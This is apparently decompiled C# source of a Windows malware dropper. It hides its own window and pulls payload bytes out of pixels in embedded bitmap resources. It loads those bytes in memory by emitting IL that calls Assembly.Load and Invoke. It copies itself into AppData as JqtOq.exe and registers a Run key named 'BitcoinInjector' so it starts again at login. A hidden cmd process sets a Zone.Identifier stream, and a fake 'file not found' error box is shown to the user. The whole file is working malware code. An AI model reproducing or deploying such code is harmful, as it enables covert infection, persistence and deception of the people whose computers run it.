using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

public sealed class Main : Form
{
	public IContainer icontainer_0;

	private string string_0;

	private Thread thread_0;

	public Main()
	{
		((Form)this).add_Load((EventHandler)Main_Load);
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		Application.EnableVisualStyles();
		method_0();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 266);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Main");
		((Form)this).set_Text("Main");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Main());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	public void method_0()
	{
	}

	public void method_1(bool bool_0, string string_1, string string_2)
	{
		try
		{
			if (!string_2.Contains(".exe"))
			{
				string_2 += ".exe";
			}
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_2;
			if (!File.Exists(text))
			{
				((ServerComputer)Class2.smethod_0()).get_FileSystem().CopyFile(Assembly.GetExecutingAssembly().Location, text, true);
				if (bool_0)
				{
					Process process = new Process();
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "cmd";
					processStartInfo.RedirectStandardInput = true;
					processStartInfo.RedirectStandardOutput = true;
					processStartInfo.UseShellExecute = false;
					processStartInfo.CreateNoWindow = true;
					process.StartInfo = processStartInfo;
					process.Start();
					StreamReader standardOutput = process.StandardOutput;
					StreamWriter standardInput = process.StandardInput;
					standardInput.WriteLine("cd " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
					standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + string_2 + ":ZONE.identifier");
					standardInput.WriteLine("exit");
					standardOutput.ReadToEnd();
					standardInput.Close();
					standardOutput.Close();
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey.GetValue(string_1) == null)
				{
					registryKey.SetValue(string_1, text);
				}
				registryKey.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object method_2(byte[] byte_0)
	{
		if (byte_0[60] == 128)
		{
			return true;
		}
		return false;
	}

	public byte[] method_3(Bitmap bitmap_0)
	{
		List<byte> list = new List<byte>();
		checked
		{
			int num = ((Image)bitmap_0).get_Width() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)bitmap_0).get_Height() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = bitmap_0.GetPixel(i, j);
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
			}
			return list.ToArray();
		}
	}

	public void method_4()
	{
	}

	public void method_5()
	{
		new decimal(647152484L);
		while (true)
		{
		}
	}

	public void method_6()
	{
		while (true)
		{
			new decimal(-379950443L);
		}
	}

	public object method_7(byte[] byte_0, object[] object_0, string string_1, string string_2)
	{
		object obj = new DynamicMethod("tmp", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		});
		object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "GetILGenerator", new object[0], (string[])null, (Type[])null, (bool[])null));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "DefineLabel", new object[0], (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateCall(objectValue, (Type)null, "DeclareLocal", new object[1] { typeof(Assembly) }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Call,
			typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Stloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue2)
		};
		object[] array2 = array;
		bool[] array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", array2, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array[1]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array4 = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue2)
		};
		object[] array5 = array4;
		array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", array5, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array4[1]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod("Invoke", new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		array4 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
		object[] array6 = array4;
		array3 = new bool[1] { true };
		NewLateBinding.LateCall(objectValue, (Type)null, "MarkLabel", array6, (string[])null, (Type[])null, array3, true);
		if (array3[0])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array4[0]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetProperty("EntryPoint")!.GetGetMethod(),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod("Invoke", new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		return NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
		{
			null,
			new object[4] { byte_0, object_0, string_1, string_2 }
		}, (string[])null, (Type[])null, (bool[])null);
	}

	public void method_8()
	{
		while (true)
		{
		}
	}

	public void method_9()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		new decimal(-1849543642L);
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			new decimal(-478251274L);
			ProjectData.ClearProjectError();
		}
	}

	public void method_10()
	{
		new decimal(8516157L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		new decimal(328297964L);
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public void method_11()
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\JqtOq.exe";
		ResourceManager resourceManager = new ResourceManager("DNvvijKTfHb", Assembly.GetExecutingAssembly());
		int num = Conversions.ToInteger(resourceManager.GetObject("ImageCount"));
		Bitmap bitmap_ = (Bitmap)resourceManager.GetObject("ImageDLL1");
		byte[] byte_ = method_3(bitmap_);
		if (File.Exists(path))
		{
			Bitmap bitmap_2 = (Bitmap)resourceManager.GetObject("Image0");
			byte[] array = method_3(bitmap_2);
			if (Operators.ConditionalCompareObjectEqual(method_2(array), (object)true, false))
			{
				method_7(byte_, new object[1] { array }, "Module1", "DoExecute");
			}
			else
			{
				method_7(byte_, new object[1] { array }, "Module1", "ÅÓ");
			}
		}
		else
		{
			int num2 = num;
			for (int i = 0; i <= num2; i = checked(i + 1))
			{
				try
				{
					Bitmap bitmap_3 = (Bitmap)resourceManager.GetObject("Image" + i);
					byte[] array2 = method_3(bitmap_3);
					if (Operators.ConditionalCompareObjectEqual(method_2(array2), (object)true, false))
					{
						method_7(byte_, new object[1] { array2 }, "Module1", "DoExecute");
					}
					else
					{
						method_7(byte_, new object[1] { array2 }, "Module1", "ÅÓ");
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			method_1(bool_0: true, "BitcoinInjector", "JqtOq.exe");
		}
		((Form)this).Close();
	}

	private void Main_Load(object sender, EventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		Control.set_CheckForIllegalCrossThreadCalls(false);
		thread_0 = new Thread(method_11);
		thread_0.Start();
		if (!File.Exists(string_0))
		{
			MessageBox.Show("ERROR_FILE_NOT_FOUND 2 (0X2)", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}
}
